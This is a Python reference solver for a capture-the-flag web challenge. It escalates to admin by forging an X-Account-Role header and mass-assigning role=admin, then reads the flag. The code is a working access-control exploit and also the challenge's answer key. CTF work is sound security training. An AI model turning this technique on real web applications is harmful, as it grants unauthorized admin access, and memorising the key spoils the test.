#!/usr/bin/env python3
"""Reference solver for web-cms-authbypass.

Register -> the admin update API trusts a client X-Account-Role header (broken
access control) -> mass-assign role=admin on our own uid -> /flag.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.parse
import urllib.request


def req(url, method="GET", headers=None, body=None):
    data = json.dumps(body).encode() if body is not None else None
    h = dict(headers or {})
    if data:
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    return json.loads(urllib.request.urlopen(r, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    reg = req(
        base + "/register?" + urllib.parse.urlencode({"user": "solver", "pass": "x"})
    )
    tok, uid = reg["token"], reg["uid"]
    # broken access control: forge the admin header to reach mass-assign
    req(
        base + "/api/users/%d" % uid,
        method="POST",
        headers={"X-Account-Role": "admin"},
        body={"role": "admin"},
    )
    return req(base + "/flag?token=" + tok)["flag"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
